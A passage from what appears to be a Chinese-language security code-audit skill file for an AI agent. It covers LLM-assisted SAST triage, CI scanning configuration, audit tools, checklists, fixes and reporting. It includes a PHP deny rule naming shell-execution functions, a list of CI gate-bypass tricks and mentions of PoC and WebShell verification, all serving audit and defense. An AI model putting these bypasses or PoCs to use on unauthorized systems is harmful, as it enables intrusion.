3. 将 SAST 告警（SARIF JSON）喂给 LLM 分类 → 误报过滤 60-90% 噪音中提取真阳
4. LLM 对高置信项输出利用链草稿 → 人工复核 + PoC 验证
5. LLM 生成修复建议 → 开发修复 → 复扫确认

工程要点:
- SAST 结果以 SARIF 标准化（sarif-tools convert），保证喂给 LLM 的结构一致
- 按函数/文件切片喂入（超长代码切片会稀释注意力，建议单文件或单函数）
- 规则：LLM 输出必须引用代码行号，无行号的结论直接丢弃
- 交叉验证：同一代码用两个模型/两次推理对比，结论不一致时降级人工
```

### 8.4 AI 驱动审计自动化管线

```
Phase 1 确定性预处理（零 LLM）：
  文件枚举 → 排除测试/文档/构建产物 → 按目录分组切片 → 生成入口点索引
Phase 2 侦察（轻量模型并行）：
  每个子系统读取配置/注册文件 → 输出结构化 JSON（入口、认证、数据流骨架）
Phase 3 深度分析（强模型）：
  对 P0/P1 目标做数据流追踪与漏洞推理 → 输出带行号的发现 + 置信度
Phase 4 对抗验证（独立模型）：
  反向反驳每个发现（模板四）→ 无法推翻才上报
Phase 5 落地：
  生成工单（含 PoC 步骤）→ 人工复核 → 修复 → 复测闭环
```

**开源参考（2026）：** Cloudflare security-audit-skill（6 阶段多智能体 + 对抗验证）、Trail of Bits skills、Capital One VulnHunter（Hunt/Fix/Verify 三阶段，Falsification Engine）、Google mantis、Vercel deepsec、raptor（Semgrep+CodeQL+fuzz 综合）。

### 8.5 大模型代码审计的边界与幻觉治理

**已知幻觉/失效模式：**
```
- 威胁过拟合：把安全上下文中的常见"问题模式"套到良性代码上（如无端怀疑正常写法）
- 确认偏差放大：安全导向提示词使模型在正常波动中"发现"攻击
- 知识过时：对已修复/版本差异的 API 凭旧知识判定
- 防御性加倍：被质疑后反而更坚定错误结论
- 编造证据：虚构不存在的文件、行号、API 参数（需行号校验拦截）
- 跨文件/跨仓库盲区：攻击路径跨模块边界时系统性漏检
- 无法检测"缺失的代码"：缺失的鉴权、缺失的限流、缺失的校验——代码里没有的东西 SAST/LLM 都难发现
```

**治理清单：**
```
- 强制证据约束：结论必须带文件:行号，行号错误即作废
- 双模型投票：两个独立模型结论冲突 → 人工介入
- 确定性锚点：用 AST/静态工具验证 LLM 提到的符号/调用真实存在
- 阈值门禁：置信度 <0.9 不进入修复工单，进"探索区"人工复核
- 沙箱验证：对可执行 PoC 在隔离环境跑真实验证（唯一硬证据）
- 记录人机分歧：维护 LLM 误报/漏报案例库，反向优化提示词
- 范围锚定：提示词声明"仅基于给定代码"，禁止引用外部假设
```

## 九、DevSecOps 审计集成

### 9.1 CI 中 SAST 配置（GitHub Actions）

```yaml
# .github/workflows/sast.yml
name: SAST
on:
  push:
    branches: [main]
  pull_request:
permissions:
  contents: read
  security-events: write
jobs:
  semgrep:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Semgrep
        run: |
          pip install semgrep
          semgrep scan --config=auto --json > semgrep.json
      - name: 上传 SARIF（GitHub Security tab 展示）
        run: |
          pip install semgrep sarif-tools
          sarif-tools convert semgrep.json -o semgrep.sarif
          # 或直接: semgrep scan --config=auto --sarif > semgrep.sarif
      - uses: github/codeql-action/upload-sarif@v3
        with:
          sarif_file: semgrep.sarif
  codeql:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: github/codeql-action/init@v3
        with: { languages: java }
      - uses: github/codeql-action/analyze@v3
```

**CI 工具链安全（2026 重要教训）：**
- Checkmarx ast-github-action 2026 年 3-4 月两轮供应链投毒事件：**必须 SHA pin，不能只 pin tag 版本**
- 示例：`uses: github/codeql-action/analyze@<完整SHA>`（tag 可被覆盖）

### 9.2 质量门禁与增量扫描

```yaml
# 门禁策略：PR 阻断规则
# 1. 新发现的高/严重级漏洞（增量扫描，diff-aware）阻断合并
# 2. 存量漏洞不计入阻断（避免历史噪音卡死开发）
# 3. 供应链：lockfile 变更触发全量 SCA
# 4. 密钥扫描：pre-commit 钩子阻断
semgrep scan --config=auto --baseline-commit HEAD~1   # 只扫本次改动
```

### 9.3 CI 中 SAST 的绕过与盲区（审计者视角）

```
- 构建模型不一致：SAST 用与生产不同的配置解析 → 结果失真
- 符号解析失败：工具静默跳过未解析的 import/类型 → 覆盖缺口
- 语言特性不支持：新语法/动态特性被忽略
- 排除规则滥用：.gitignore/semgrepignore 把敏感目录（routes/controllers）排除
- 扫描超时跳过：大文件 5MB 上限、超时静默跳过（应显式报告 SKIPPED）
- 门禁绕过：--no-error、exit 0 强制通过、baseline 刷新误删告警
- 工具本身被投毒：CI 拉取恶意 Action 版本（见 9.1）
- 审计对策：抽查 SARIF 的 skip/error 条目，检查 CI 日志中工具是否真实运行
```

### 9.4 结果标准化与去噪

```bash
# SARIF 统一格式（跨工具聚合）
semgrep scan --config=auto --sarif > semgrep.sarif
codeql database analyze ./db --format=sarif-latest -o codeql.sarif

# 去噪策略
- 按规则 ID 统计误报率，高误报规则降级/调参
- 结果按"可利用性"排序而非规则严重度
- 自动化 triage：LLM 分类（见第八章）后只留 P0/P1 进工单
- 维护基线：每轮扫描与基线 diff，只处理增量
```

## 十、工具链

### 10.1 静态分析（SAST）

```bash
# 快速、可自定义规则、多语言
semgrep scan --config=auto --severity=ERROR,WARNING ./src
semgrep scan --config=p/owasp-top-ten ./src

# 语义级分析（自定义查询语言，跨过程污点追踪）
codeql database create ./db --language=java --source-root=./src
codeql database analyze ./db security-and-quality.qls --format=sarif-latest

# 企业级
SonarQube           # 代码质量+安全，质量门禁
Checkmarx One       # 企业治理、75+ 语言
Fortify / Veracode  # 大型企业合规

# 语言专项
bandit ./src -r                     # Python
gosec ./...                          # Go
npm audit; eslint-plugin-security    # Node.js
spotbugs / find-sec-bugs             # Java
```

### 10.2 依赖与供应链（SCA）

```bash
trivy fs --scanners vuln,secret,misconfig .   # 快、全能
grype ./                                       # Anchore
snyk test --all-projects
npm audit --json; pip audit
owasp-dependency-check.sh --scan .
syft dir:./src -o spdx-json > sbom.json        # SBOM
npx supply-chain-guard scan ./                 # 恶意包/投毒专项
```

### 10.3 密钥检测

```bash
gitleaks detect --source . --log-opts="--all"
trufflehog git https://github.com/org/repo
git-secrets --scan-history
# 注意：历史提交中的密钥需清除重写（git filter-repo），删除文件不够
```

### 10.4 反混淆与逆向

```bash
# 静态去混淆
npx js-beautify suspect.js -o clean.js
de4js / JSDetox / JStillery         # JS 去混淆
npx esprima clean.js > ast.json     # AST 分析

# Java/.NET 反编译
jadx apk/app.jar                    # Java/Android
jd-gui / CFR                        # Java
dnSpy                               # .NET
Ghidra / IDA                        # 二进制

# 动态
cuckoo / CAPE（沙箱）; Node 受控 VM; 隔离网段流量捕获
```

### 10.5 AI 辅助审计工具（2025-2026）

```bash
# 开源 AI 安全框架/技能
# Cloudflare security-audit-skill（多智能体+对抗验证）
# Capital One VulnHunter（Hunt/Fix/Verify + 反驳引擎，Claude Code skill）
# Google mantis / Trail of Bits skills（技能包）
# Vercel deepsec / raptor（SAST+LLM+fuzz 综合）

# 商业 AI SAST
# Semgrep Assistant（AI 分类/去噪）; GitHub Copilot Autofix; Snyk Code Agent Fix
# OpenAI Codex Security（2026-07 发布：identify/validate/fix 三合一 CLI）
```

## 十一、测试检查清单

### 11.1 攻击面与入口
- [ ] 已枚举全部 HTTP/消息/定时任务/CLI 入口点
- [ ] 已识别隐藏入口（actuator/debug/测试接口）
- [ ] 已确认哪些入口无鉴权直接可达敏感操作
- [ ] 已按攻击面优先级矩阵（P0-P3）排定审计顺序

### 11.2 数据流与注入
- [ ] Source-Sink 数据流追踪（含跨文件/跨函数）
- [ ] 输入验证（类型/长度/范围/格式/白名单）
- [ ] 输出编码（HTML/JS/URL/CSS/JSON 上下文）
- [ ] SQL 注入（拼接/${}/FromSqlRaw/execute 格式化）
- [ ] 命令注入（shell 调用/系统调用拼接）
- [ ] 反序列化（readObject/load/unserialize/TypeNameHandling）
- [ ] SSRF（URL 用户可控 + 内网可达）
- [ ] 路径遍历/任意文件读写（含 Zip Slip）
- [ ] 二次注入/存储型污染（入库→读库→再拼接）
- [ ] XSS/模板注入（SSTI/客户端渲染）

### 11.3 认证授权
- [ ] 密码策略/存储/暴力破解防护
- [ ] 会话管理（固定/劫持/超时）
- [ ] JWT（算法混淆/alg=none/kid 注入/过期校验）
- [ ] OAuth/OIDC（redirect_uri/state/scope/PKCE）
- [ ] 水平越权（IDOR）/垂直越权/功能级越权
- [ ] 文件级越权/API 越权（BOLA/BFLA/Mass Assignment）
- [ ] 云/IaC 权限配置（IAM/RLS/存储桶策略）

### 11.4 业务逻辑
- [ ] 支付/订单（价格篡改/负数/幂等/回调重放）
- [ ] 优惠券/积分/验证码（复用/超额/竞态）
- [ ] 密码重置/注册/邮件注入
- [ ] 竞态条件（TOCTOU/并发扣减/状态机）

### 11.5 供应链
- [ ] 依赖 CVE 扫描（含传递依赖）
- [ ] 恶意包检测（typosquatting/dependency confusion/安装钩子）
- [ ] 第三方库源码抽审（混淆/外传/后门特征）
- [ ] 密钥泄露扫描（含 Git 历史）
- [ ] SBOM/锁定文件校验（npm lockfile/go.sum 完整性）

### 11.6 反混淆与对抗
- [ ] 已识别混淆类型并还原可读代码
- [ ] 已对可疑载荷做动态行为分析
- [ ] 已提取 IOC（URL/域名/熵值字符串）

### 11.7 AI 辅助审计
- [ ] SAST 告警已过 LLM 误报过滤
- [ ] 每个 AI 发现已核验文件:行号
- [ ] 高置信发现已做对抗反驳验证
- [ ] 关键结论已人工复核 + PoC 验证

### 11.8 工程化闭环
- [ ] CI 已接入 SAST+SCA+密钥扫描（SHA pin）
- [ ] 质量门禁已配置且可审计（无 --no-error 逃逸）
- [ ] 报告含证据链（PoC/时间线/修复建议）
- [ ] 修复后已复测关闭

## 十二、修复建议

### 12.1 通用修复模式

```
- SQL 注入 → 参数化查询/ORM 预编译；MyBatis 用 #{} 弃 ${}；拒绝拼接
- 命令注入 → 参数数组形式（不经过 shell）；白名单命令与参数；最少权限用户
- 反序列化 → 强类型白名单/ObjectInputFilter/TypeNameHandling.None；禁用危险框架默认值
- SSRF → 协议白名单（http/https）+ DNS 解析后 IP 二次校验 + 内网段拦截 + 302 跟随限制
- 路径遍历 → realpath/normalize + 前缀校验 + 拒绝绝对路径/../；随机文件名
- XXE → 禁用 DOCTYPE/外部实体（disallow-doctype-decl + external-general-entities=false）
- XSS → 输出编码按上下文；CSP 非严格模式一律加 nonce/hash
- 越权 → 服务端强制 RBAC + 行级数据所有权校验（资源归属=会话主体）+ RLS
- 竞态 → 数据库原子操作/分布式锁/幂等键；状态机加锁流转
- 密钥 → 移除明文；接密钥管理（Vault/KMS）；轮换受影响凭据
```

### 12.2 框架层加固

```java
// Spring：全局异常统一处理，禁止堆栈外泄
// Fastjson：ParserConfig.getGlobalInstance().setSafeMode(true)
// Jackson：activateDefaultTyping 禁用 / 自定义白名单
// SnakeYAML：yaml.loadAs(input, TargetClass.class) 替代 load()
```
```go
// 禁用 cgo 提权面；构建时 -buildmode=pie -trimpath
// 所有外部输入统一过 validator（go-playground/validator）
```
```js
// 冻结 Object.prototype：Object.freeze(Object.prototype)
// 安全解析：JSON.parse 替换 eval；深拷贝用 structuredClone 而非手写 merge
```
```php
// 类型比较全部 ===；文件包含白名单映射；phar:// 限制
// ini: disable_functions=system,exec,shell_exec
```
```csharp
// BinaryFormatter 弃用（.NET 9 已移除）；Json.NET 禁 TypeNameHandling
// DataProtectionProvider 管理机器密钥
```

### 12.3 依赖与供应链修复

```bash
# 升级 EOL 组件（Log4j 1.x / Fastjson 1.x → Fastjson2 / 老 Jackson）
# 修复命令示例
pip install --upgrade requests
npm update lodash minimist
go get -u github.com/xxx/yyy

# lockfile 完整性校验（CI 中）
npm ci --ignore-scripts            # 跳过安装钩子（防御 install 脚本投毒）
pip install --require-hashes -r requirements.txt
go mod verify

# 恶意包应急处置：定位受影响主机 → 视为失陷 → 清理 → 轮换凭据 → 审计后续动作
```

### 12.4 修复验证

```bash
# 修复后复扫（应清零对应规则告警）
semgrep scan --config=semgrep-rules/taint-sqli.yaml --baseline-commit HEAD~1 ./src
# 回归测试：原 PoC 应失效；功能测试通过
# 将修复写入安全编码规范，防止回归
```

## 十三、审计报告与证据链

### 13.1 报告结构（模板）

```
1. 执行摘要：范围、方法、统计（高危 N/中危 N）、Top3 风险
2. 审计范围与方法：目标系统、时间窗口、工具链、人工审计模块
3. 漏洞明细（每个漏洞一节）：
   - 漏洞名称 + 危害等级（CVSS 4.0 向量）
   - 受影响组件/接口（文件:行号 / 端点 URL）
   - 漏洞原理（代码片段标注）
   - 攻击路径与复现步骤（含请求包/PoC）
   - 影响分析（数据/系统/业务）
   - 修复建议（代码级 + 架构级）
4. 审计覆盖度说明：未覆盖模块、工具盲区、遗留风险
5. 附录：工具输出（SARIF）、IOC、时间线
```

### 13.2 证据链要素（缺一不可）

```
- 代码证据：危险代码段 文件:行号 + 上下文 5 行
- 复现证据：完整请求包/输入样本 + 观察到的现象（响应/日志/回连）
- 路径证据：Source→Transform→Sink 的完整调用链截图/输出
- 时间证据：测试时间戳、环境版本（框架/JDK/中间件）
- 环境证据：测试环境与生产环境差异说明（避免误判）
- PoC 代码：可执行、可复现、注释清晰（授权范围内运行）
```

### 13.3 漏洞分级（CVSS 4.0 要点）

```
- 按 CVSS 4.0 打分：Attack Vector/Complexity/Privileges/User Interaction/Impact
- 结合业务上下文调整：可远程未认证触发 > 需本地认证；RCE > 信息泄露
- 供应链类单列：即使当前不可利用，投毒/后门按"疑似失陷"上报
- 区分：可利用漏洞 / 加固项 / 观测项（低危但值得记录）
```

### 13.4 跟踪与复测闭环

```
- 每个漏洞分配编号 + 责任人 + 修复期限
- 修复后复测：同 PoC 重放 → 确认失效；代码复扫 → 告警清零
- 输出复测结论表：编号 | 状态（已修复/部分/未修复/误报确认）
- 归档：报告 + 证据 + 复测记录进知识库，支撑下次审计基线
```

## 十四、注意事项与合规

- **仅限授权测试**：本技能所有审计、反混淆、PoC 构造、AI 辅助分析行为，**仅允许在获得书面授权的目标系统/代码库上执行**。未经授权对他人代码进行漏洞挖掘、对第三方系统进行扫描验证属违法行为，后果自负
- **合规声明**：遵守《网络安全法》《数据安全法》《个人信息保护法》及相关地方法规；跨境/受监管行业（金融、医疗、政务）审计须提前确认数据合规边界；供应链审计注意第三方开源许可与保密协议
- **最小影响**：验证漏洞优先使用无害探测（DNSLog/HTTP 回连），确认后再在隔离环境执行完整 PoC；严禁在生产环境做破坏性验证
- **数据保护**：审计过程中不读取、不复制、不外传敏感业务数据；凭据类发现仅报告位置与处置建议，不在报告中展示明文
- **证据处理**：证据链材料（请求包、PoC、日志）按密级管理，防止二次泄露；报告中脱敏个人信息
- **AI 输出审慎**：LLM 生成的漏洞结论、修复代码、反混淆结果均需人工复核，防止幻觉结论进入报告或修复引入新漏洞
- **工具自身风险**：审计工具链（Action/插件/混淆还原工具）本身可能被投毒，运行时校验版本与完整性（SHA pin）；在隔离环境运行可疑样本与反混淆工具
- **供应链应急**：确认依赖投毒/后门后，按"疑似失陷"处置（主机隔离→凭据轮换→全量排查），勿只删包了事
- **清理痕迹**：测试完成后删除所有写入的文件、WebShell、临时账号与沙箱样本
- **情报更新**：漏洞模式、工具能力、供应链攻击手法持续演进（如 2026 年 Fastjson2 哈希碰撞链、npm 批量投毒活动），审计基线应随公开情报季度性刷新
- **报告伦理**：漏洞披露遵循"先厂商后公开"原则；0day 级发现（如 Fastjson 1.2.83 Gadget-free 类）上报优先级高于公开讨论

## DECISION TREE

```
审计对象与入口？
├── 明确漏洞类型假设 → 第二章对应语言漏洞模式直接匹配
├── 常规项目 → 第一章攻击面驱动：先列框架路由/sink 面 → 反查 source → 第三章数据流追踪
├── 认证/授权模块 → 第四章专项（会话/越权/混淆代理人）
├── 业务关键流（支付/权限/配额）→ 第五章逻辑审计
├── 依赖清单存在 → 第六章供应链审计（联动 dependency-confusion）
├── 代码混淆/加固 → 第七章反混淆对抗
├── AI 生成代码占比高 → 第八章幻觉失效模式优先扫描
└── 产出 → 第十三章证据链格式（source→sink→PoC）→ 对齐 pentest-output-standards
```

## TARGET TOOL ADAPTATION

Use visible `read_file`/`glob`/`grep` for 代码检索与数据流人工追踪、`execute-python-script` for 批量模式匹配与 sink 统计。不假设 SAST/SCA 平台可达；审计结论必须附可复现 PoC 或反例路径。

## RELATED ROUTING

- [source-code-hunting](../source-code-hunting/SKILL.md) — 源码敏感信息与漏洞模式挖掘的攻击侧对应
- [web-attack-methods](../web-attack-methods/SKILL.md) — 审计结论到 Web 验证的衔接
